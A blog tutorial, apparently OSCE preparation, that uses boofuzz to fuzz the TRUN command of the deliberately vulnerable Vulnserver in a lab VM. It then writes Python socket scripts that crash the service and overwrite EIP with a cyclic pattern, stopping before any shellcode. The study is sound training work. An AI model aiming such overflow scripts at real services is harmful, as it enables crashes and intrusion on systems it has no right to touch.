---
layout: single
title: Boofuzz to EIP Overwrite
date: 2019-5-24
classes: wide
header:
  teaser: /assets/images/CTP/1920x1080_Wallpaper.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post, we will become acquainted with the `boofuzz` fuzzer and use it to discover an EIP overwrite vulnerability in Vulnserver. 

## Preparing Our Environment

For this excercise we will need to procure:
+ Windows 7 VM,
+ boofuzz,
+ vulnserver, 
+ Immunity Debugger,
+ Mona, and
+ a remote attacker box (I'll be using Kali).

### Windows 7 VM
For my lab setup, I downloaded an x86 Windows 7 image for Virtualbox [directly from Microsoft](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) and took a snapshot so that in 90 days, if I still want the VM I won't have to start the process of installing and configuring it from scratch! 

I found that when I downloaded and booted the 'VMware x86' images, they were in fact 64-bit, so beware of that possibility. 

### Boofuzz
Next we will need to install `boofuzz` on our attacker box. If you are on a Debian-based Linux machine, you can run the following commands (if you do not have `pip` installed, first run `apt-get install python-pip`):
1. `git clone https://github.com/jtpereyda/boofuzz`
2. `cd boofuzz`
3. `pip install .`

You can read more about `boofuzz` installation and documentation [here](https://boofuzz.readthedocs.io/en/latest/user/install.html).

### Vulnserver
Now we need our badly written application. I downloaded and used the `.zip` hosted [here](http://sites.google.com/site/lupingreycorner/vulnserver.zip) from my Windows 7 VM, but feel free to download directly from the autor [here](https://github.com/stephenbradshaw/vulnserver). 

The `.exe` will run as long as its companion `essfunc.dll` file is in the same location. I moved both to my desktop for ease of use in the Windows 7 VM. 

### Immunity Debugger
Next we will download our debugger which we will use to investigate how vulnserver is behaving under different circumstances. Access the [download link](https://debugger.immunityinc.com/ID_register.py) from your Windows 7 VM, and fill out the requisite information (I believe dummy data will suffice.) Once you start the installer, it will notice that you do not have Python installed and offer to install it for you. 

### Mona
Mona is a very robust Python tool that can be used inside Immunity to perform a broad range of analysis for us. To install Mona, I just visited the [Corelan Mona repo](https://github.com/corelan/mona/blob/master/mona.py) and copied the raw text to a txt document inside my Windows 7 VM and saved it as `mona.py`. 

We want `mona.py` to be saved in the following directory: `C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`. 

## Exploring Vulnserver
The first thing we want to do is run vulnserver.exe and then interact with the application as a normal client to determine how the application works under normal circumstances. We don't need to run the process in Immunity just yet. Start the application and you should recieve the following Windows prompt:

![](/assets/images/CTP/vulnserver.JPG)

Next, we want to interact with the listening service from our attacker and determine how the application is supposed to work. We can use `netcat` for this and we'll just make a simple TCP connection to the target with the following command: 
```terminal_session
nc <windows7 IP address> 9999
```

Immediately we see that the connection is made and that the server is offering us the `HELP` command to show us valid commands for the service. Once we send the `HELP` command we get the following output:

![](/assets/images/CTP/netcat.JPG)

Seeing that the valid argument structure for each command is roughly `<command>[space]<command_value>` we can send something like `TRUN hello` as a test and see if it's accepted. 

![](/assets/images/CTP/trun.JPG)

We can see that the command and argument executed successfully. Now that we have confirmed the structure of a command and its arguments, we can start fuzzing this command to see if we can get the program to crash when submitting various argument values to the `TRUN` command. 

## Using Boofuzz
Working off of a very detailed and helpful working aid from [zeroaptitude.com](https://zeroaptitude.com/zerodetail/fuzzing-with-boofuzz/), we learn that the first element of any `boofuzz` fuzzing script is the 'session.' (For this excercise I worked directly out of the `boofuzz` directory.)

The purpose of the session is to establish a named entity which details: the host we want to connect to, the port we want to connect to, and the parameters we want to fuzz.

Let's establish our `boofuzz` script skeleton:
```python
#!/usr/bin/python

from boofuzz import *


def main():
 
        
if __name__ == "__main__":
    main()
```

This skeleton, once it includes a 'session', will be our template for all of our subsequent fuzzing scripts. The session will be defined in the `main()` function and will establish a variable named `session` which will comprise a few global variables, namely: `host` and `port` for this excercise. Let's see our code below:
```python
#!/usr/bin/python

from boofuzz import *

host = '192.168.1.201'	#windows VM
port = 9999		#vulnserver port

def main():
	
	session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))
	
	s_initialize("TRUN")	#just giving our session a name, "TRUN"

    	s_string("TRUN", fuzzable = False)	#these strings are fuzzable by default, so here instead of blank, we specify 'false'
    	s_delim(" ", fuzzable = False)		#we don't want to fuzz the space between "TRUN" and our arg
   	s_string("FUZZ")			#This value is arbitrary as we did not specify 'False' for fuzzable. Boofuzz will fuzz this string now.
 
        
if __name__ == "__main__":
    main()
```

Excellent, we have the first crucial piece to our `boofuzz` puzzle. Now we just need to add a couple lines to join our session with our actual fuzzing functions, we can accomplish this by appending the following two lines to our code:
```python
session.connect(s_get("TRUN"))		#having our 'session' variable connect following the guidelines we established in "TRUN"
session.fuzz()				#calling this function actually performs the fuzzing
```

Our complete code now looks like this: 
```python
#!/usr/bin/python

from boofuzz import *

host = '192.168.1.201'	#windows VM
port = 9999		#vulnserver port

def main():
	
	session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))
	
	s_initialize("TRUN")	#just giving our session a name, "TRUN"

    	s_string("TRUN", fuzzable = False)	#these strings are fuzzable by default, so here instead of blank, we specify 'false'
    	s_delim(" ", fuzzable = False)		#we don't want to fuzz the space between "TRUN" and our arg
   	s_string("FUZZ")			#This value is arbitrary as we did not specify 'False' for fuzzable. Boofuzz will fuzz this string now
 
        session.connect(s_get("TRUN"))		#having our 'session' variable connect following the guidelines we established in "TRUN"
    	session.fuzz()				#calling this function actually performs the fuzzing

if __name__ == "__main__":
    main()
```

Since we want to determine how the application reacts to our fuzzing script, we need to start the `vulnserver.exe` in Immunity. This is easily accomplished by dragging the `vulnserver.exe` icon on the desktop to the Immunity icon which will automatically open Immunity with the `vulnserver.exe` process attached. If you have never used Immunity before, do not worry, there are a ton of great guides online and I will be linking themn in the resources section. 

One thing to know is that when you attach a process to Immunity in the way we just described, the process is not actually running yet. We need to press the small red 'play' triangle to start the process as if we just double-clicked it on the desktop. Immunity even gives us a terminal prompt as if we were running vulnserver on it's own. 

Red 'play' triangle in lower right hand side of image:

![](/assets/images/CTP/triangle.JPG)

If you notice, in the bottom right hand side of Immunity, there is a yellow and red message `Paused` indicating that the process is not running. After pressing the play symbol (alternatively, you can use the `F9` key to start the process), we need to run our python script from our attacker to begin fuzzing the application. 

If we see at any point that Immunity gives us an `Access Violation` error message at the bottom, we know that the program has crashed due to our fuzzing and we can stop our fuzzer script on our attacker. 

We see pretty quickly that our fuzzer has crashed the application. After stopping our script, we examine the `Registers (FPU)` pane in Immunity and see that several locations now hold references to our payload of `41` which is the hexidecimal representation of a capital `A`. This means that whenever we send our payload, it is written into these locations in memory on the victim. We notice that `EAX`, `ESP`, `EBP`, and `EIP` all contain references to our long string of `A` with `EAX` also sporting a preprended `TRUN /.:/` string. 

![](/assets/images/CTP/aaa.JPG)

Essentially what we have discovered at this point is that, we are able to subvert the expected application input in a way that allows to take control of the value of `EIP`. `EIP`'s job is to contain the address in memory of the next instruction to be executed. So if we can tell the process where to go, we can tell it what to execute. If we can tell it what to execute, there is a chance we can get it to execute a malicious payload. 

## Exploiting the EIP Overwrite

Well, we know at this point that we can affect the value of `EIP`, but what we don't know, is how far into our payload of `A` the `EIP` overwrite occurred. We don't even know how many bytes of data we sent to the application at this point, we kind of just hit a giant Fuzz Button and watched our application crash. Luckily, `boofuzz` stores some useful information for us in a sql-lite type db in the `boofuzz-results` directory after each session. Opening the relevant session in the gui as follows: 

![](/assets/images/CTP/results.JPG)

In entry 15, we see our familiar string `TRUN /.:` and the entry above it, 14, states that `boofuzz` sent 5011 bytes:

![](/assets/images/CTP/5011.JPG)

What we'll do now is, create our exploit skeleton in python and test to see if sending 5011 bytes worth of `A` results in us getting the same `41414141` value overwritten to `EIP`. 

### exploitSkeleton.py

We can craft up a skeleton exploit that we can stash away for later use and edit copies of as we need them throughout this series. Our exploit skeleton will be the following:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "<host IP>"
port = <host PORT>

buffer = "<string we want to send>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send(buffer)
print s.recv(1024)
s.close()
```

Let's edit this code to match our exact situation by changing the `host`, `port`, and `buffer` variables. Let's also keep in mind that the fuzzer prepended our fuzz-string with `TRUN /.:/ ` so it's not just as simple as multiplying `A` by 5011. We have to prepend our `TRUN` argument as well. Our final payload should look something like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = "A" * 5011

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```

Running this python script with vulnserver attached in Immunity nets us the same `Registers (FPU)` panel, excellent. So we know for certain that we can overwrite `EIP`. The next step is to determine how far into our string of 5011 `A` the overwrite occurs. 

To determine this, we can leverage Mona's ability to create a "cyclical" string of data which never repeats any patterns. This string of data will overwrite `EIP` and provide us with an exact location of where in our string the overwrite occurred since we'll have a reference point to a unique set of 4 hex characters. 

To make Mona create our string, we use the following command in the white bar at the bottom of the Immunity GUI:
`!mona pc 5011` ('pc' is short for 'pattern-create' and there are multiple scripts and tools out there that will perform this for you, including Metasploit. I prefer using Mona since I'm already in Immunity. 

![](/assets/images/CTP/pc.JPG)

Mona outputs this string (use the ASCII one) to a file called `pattern.txt` which is located in the `C:\Program Files\Immunity Inc\Immunity Debugger` directory. Make sure you copy the string from this file and not the pane in Immunity as the string in the pane might be truncated (especially at 5000 bytes). This string now becomes our buffer and we feed it back to a restarted vulnserver process in Immunity. 

So now our `exploit.py` looks like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9G"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```

--To Be Continued--
